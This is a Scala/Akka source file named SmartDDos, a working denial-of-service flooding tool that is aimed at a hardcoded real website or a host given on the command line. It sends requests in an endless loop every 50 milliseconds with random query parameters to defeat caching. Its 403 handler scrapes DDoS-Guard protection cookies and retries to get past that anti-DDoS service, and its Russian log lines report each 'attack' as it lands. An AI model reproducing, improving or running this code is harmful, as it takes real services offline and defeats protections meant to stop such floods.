package hi

import akka.actor.ActorSystem
import akka.http.scaladsl.Http
import akka.http.scaladsl.model.{HttpRequest, HttpResponse, StatusCodes, headers}
import hi.Agents.getCustomClientAgent
import hi.Test.randomQueryParam

import scala.concurrent.{ExecutionContextExecutor, Future}

object SmartDDos {

  var agent = getCustomClientAgent

  var cookieMap = scala.collection.mutable.HashMap.empty[String, String]
  cookieMap += ("" -> "")
/*  cookieMap += ("__ddg5" -> "CerhqdIFojZ9MVAT")
  cookieMap += ("__ddg2" -> "0Q2fU8u8jOJGHgeh")
  cookieMap += ("__ddgid" -> "8YF4fMwnYNaWTn9E")
  cookieMap += ("__ddgmark" -> "Jz3PiRCWmeLa3obz")
  cookieMap += ("__ddg1" -> "F5gnvAGHRcd0Z3RzJlbN")*/

  def innerRequest(url: String, recursion: Boolean, getCookie: Boolean = false)(implicit system: ActorSystem, executionContext: ExecutionContextExecutor): Future[Unit] = {
    val str = randomQueryParam(url)

    Http().singleRequest(HttpRequest(uri = str).withHeaders(
      headers.RawHeader("Cache-Control", "no-cache"),
      headers.Cookie(cookieMap.map(i => (i._1, i._2)).toSeq:_*),
      headers.RawHeader("User-Agent", agent)
    )).flatMap {
      case HttpResponse(StatusCodes.OK, _, _, _) =>
        Future.successful {
          if (!recursion) {
            println(s"Аттака $str - ОК")
          } else {
            println(s"Аттака после редиректа $str")
          }
        }
      case HttpResponse(StatusCodes.Redirection(_), headers, _, _) =>
        Future.successful {
          if (recursion) {
            println(s"too many redirects $url")
          } else {
            val link = headers.filter(ss => ss.name().equals("Location"))

            if (link.nonEmpty && link.head.value().startsWith("http") && link.head.value() != str) {
              innerRequest(link.head.value(), true)
            } else {
              println(s"error redirect $url")
            }
          }
        }

      case HttpResponse(StatusCodes.Forbidden, headers, _, _) =>
        Future.successful{
          println(s"Доступ запрещен - 403 для цели $url")
          println(s"Запрос новых куков...")

          if(headers.exists(p => p.name() == "Server" && p.value() == "ddos-guard")) {
            //agent = getCustomClientAgent
            if(getCookie)
              cookieMap.clear()

            headers.find(_.value().startsWith("__ddgid")).foreach{
                h =>
                  val s = h.value().split(";").head.split("=")

                  if (s.size == 2) {
                    cookieMap += (s.head -> s(1))
                  }
            }
            headers.find(_.value().startsWith("__ddgmark")).foreach{
                h =>
                  val s = h.value().split(";").head.split("=")

                  if (s.size == 2) {
                    cookieMap += (s.head -> s(1))
                  }
            }
            headers.find(_.value().startsWith("__ddg5")).foreach{
                h =>
                  val s = h.value().split(";").head.split("=")

                  if (s.size == 2) {
                    cookieMap += (s.head -> s(1))
                  }
            }
            headers.find(_.value().startsWith("__ddg1")).foreach{
              h =>
                val s = h.value().split(";").head.split("=")

                if (s.size == 2) {
                  cookieMap += (s.head -> s(1))
                }
            }
            headers.find(_.value().startsWith("__ddg2")).foreach{
              h =>
                val s = h.value().split(";").head.split("=")

                if (s.size == 2) {
                  cookieMap += (s.head -> s(1))
                }
            }

            innerRequest(url, recursion = true, getCookie = true)
          }
        }
      case err =>
        sys.error(s"server is not responding: $err")
    }
  }

  val target = "https://xaknet.team/help.html"

  def main(args: Array[String]): Unit = {
    implicit val system: ActorSystem = ActorSystem()
    implicit val executionContext: ExecutionContextExecutor = system.dispatcher

    val host = if (args.length == 1) {
      args.head
    } else target

    while (true) {
      innerRequest(host, false)
      Thread.sleep(50)
    }
  }
}
